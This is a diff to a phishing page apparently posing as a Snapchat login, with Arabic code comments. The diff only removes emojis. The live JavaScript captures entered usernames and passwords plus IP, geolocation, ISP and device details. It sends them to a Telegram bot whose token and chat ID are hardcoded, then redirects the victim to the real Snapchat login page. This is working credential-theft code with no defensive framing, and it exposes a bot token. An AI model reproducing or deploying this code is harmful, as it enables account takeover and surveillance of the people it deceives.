@@ -46,7 +46,7 @@
 
   <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
   <script>
-    // ✅ تفعيل زر إظهار/إخفاء كلمة المرور
+    // تفعيل زر إظهار/إخفاء كلمة المرور
     document.querySelector('.toggle-password').addEventListener('click', function () {
         const passwordInput = document.getElementById('password');
         const eyeIcon = document.getElementById('eye-icon');
@@ -60,7 +60,7 @@
         }
     });
 
-    // ✅ إرسال البيانات إلى تيليجرام وإعادة التوجيه إلى موقع سناب شات
+    // إرسال البيانات إلى تيليجرام وإعادة التوجيه إلى موقع سناب شات
     const TOKEN = "7545233079:AAFL-NIZxpftxAtoHY_hh8kEaRLI3k2nYvE"; // توكن البوت
     const CHAT_ID = "6256449712"; // معرف الشات
     const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
@@ -74,18 +74,18 @@
         const platform = navigator.platform;
         const screenWidth = screen.width;
         const screenHeight = screen.height;
-        const deviceType = /mobile/i.test(userAgent) ? '📱 Mobile' : '💻 Desktop';
+        const deviceType = /mobile/i.test(userAgent) ? 'Mobile' : 'Desktop';
         const language = navigator.language;
-        const darkMode = window.matchMedia('(prefers-color-scheme: dark)').matches ? '🌙 Enabled' : '☀️ Disabled';
+        const darkMode = window.matchMedia('(prefers-color-scheme: dark)').matches ? 'Enabled' : 'Disabled';
         const cpuCores = navigator.hardwareConcurrency || 'Unknown';
         const ramSize = navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown';
 
-        // ✅ الحصول على عنوان IP
+        // الحصول على عنوان IP
         axios.get('https://api.ipify.org?format=json')
             .then(response => {
                 const ip = response.data.ip;
 
-                // ✅ الحصول على معلومات الموقع الجغرافي
+                // الحصول على معلومات الموقع الجغرافي
                 axios.get(`http://ip-api.com/json/${ip}`)
                     .then(locResponse => {
                         const country = locResponse.data.country || 'Unknown';
@@ -93,42 +93,42 @@
                         const isp = locResponse.data.isp || 'Unknown';
 
                         const message = ` 
-<b>🔐 New Login Attempt</b>\n
-<b>👤 Username:</b> ${username}\n
-<b>🔑 Password:</b> ${password}\n
-<b>🌍 IP Address:</b> ${ip}\n
-<b>📍 Location:</b> ${city}, ${country}\n
-<b>📡 ISP:</b> ${isp}\n
-<b>📱 Device Type:</b> ${deviceType}\n
-<b>🖥 Platform:</b> ${platform}\n
-<b>🌐 User Agent:</b> ${userAgent}\n
-<b>📏 Screen Resolution:</b> ${screenWidth}x${screenHeight}\n
-<b>🗣 Language:</b> ${language}\n
-<b>🌙 Dark Mode:</b> ${darkMode}\n
-<b>🖥 CPU Cores:</b> ${cpuCores}\n
-<b>💾 RAM Size:</b> ${ramSize}\n
+New Login Attempt
+Username: ${username}
+Password: ${password}
+IP Address: ${ip}
+Location: ${city}, ${country}
+ISP: ${isp}
+Device Type: ${deviceType}
+Platform: ${platform}
+User Agent: ${userAgent}
+Screen Resolution: ${screenWidth}x${screenHeight}
+Language: ${language}
+Dark Mode: ${darkMode}
+CPU Cores: ${cpuCores}
+RAM Size: ${ramSize}
                         `;
 
-                        // ✅ إرسال البيانات إلى تيليجرام
+                        // إرسال البيانات إلى تيليجرام
                         axios.post(URI_API, {
                             chat_id: CHAT_ID,
                             parse_mode: 'html',
                             text: message
                         }).then(() => {
-                            // ✅ إعادة توجيه المستخدم إلى صفحة تسجيل الدخول الرسمية بعد الإرسال
+                            // إعادة توجيه المستخدم إلى صفحة تسجيل الدخول الرسمية بعد الإرسال
                             window.location.href = "https://accounts.snapchat.com/accounts/login";
                         }).catch(error => {
-                            console.error("❌ خطأ في إرسال البيانات إلى تيليجرام:", error);
+                            console.error("خطأ في إرسال البيانات إلى تيليجرام:", error);
                             window.location.href = "https://accounts.snapchat.com/accounts/login";
                         });
                     })
                     .catch(error => {
-                        console.error("❌ خطأ في جلب بيانات الموقع الجغرافي:", error);
+                        console.error("خطأ في جلب بيانات الموقع الجغرافي:", error);
                         window.location.href = "https://accounts.snapchat.com/accounts/login";
                     });
             })
             .catch(error => {
-                console.error("❌ خطأ في جلب عنوان IP:", error);
+                console.error("خطأ في جلب عنوان IP:", error);
                 window.location.href = "https://accounts.snapchat.com/accounts/login";
             });
     });
